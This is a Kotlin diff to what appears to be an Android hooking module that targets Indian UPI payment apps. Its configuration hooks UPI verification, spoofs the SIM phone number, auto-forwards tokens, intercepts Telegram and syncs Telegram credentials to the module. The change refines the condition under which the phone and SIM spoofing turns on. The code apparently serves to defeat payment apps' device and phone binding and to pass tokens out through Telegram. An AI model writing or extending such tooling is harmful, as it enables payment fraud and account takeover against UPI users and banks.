@@ -11,6 +11,9 @@ object HookScopeBootstrap {
 
         val allHooked = UpiAppRegistry.nativeHookPackages().associate { it.packageName to true }
         val phone = configManager.readSpoofPhone().ifBlank { current.mockPhoneSim1 }
+        val mockReady = phone.count { it.isDigit() } >= 10
+        val mockOn = mockReady &&
+            (current.enableVirtualSim || current.enableSim1Mock || current.enablePhoneSpoof)
         val updated = current.copy(
             hookedUpiApps = allHooked,
             hookUpiVerification = true,
@@ -19,14 +22,14 @@ object HookScopeBootstrap {
             autoForwardToken = true,
             fakeInterceptTelegram = true,
             autoHookForeground = true,
-            enableVirtualSim = current.enableVirtualSim || current.enableSim1Mock || current.enablePhoneSpoof,
-            enableSim1Mock = current.enableSim1Mock || current.enableVirtualSim || current.enablePhoneSpoof,
-            enablePhoneSpoof = current.enablePhoneSpoof || current.enableVirtualSim || current.enableSim1Mock,
-            mockPhoneSim1 = phone
+            enableVirtualSim = mockOn,
+            enableSim1Mock = mockOn,
+            enablePhoneSpoof = mockOn,
+            mockPhoneSim1 = if (mockReady) phone else current.mockPhoneSim1
         )
         if (!configManager.saveAndFlushSync(updated)) return
 
-        if (phone.isNotBlank()) configManager.writeSpoofPhoneSync(phone)
+        if (mockReady) configManager.writeSpoofPhoneSync(phone)
         syncTelegramCredsToModule(configManager)
         ActiveHookManager.persistHookedScope(allHooked.keys)
         ActiveHookManager.persistAllSelected(allHooked.keys)
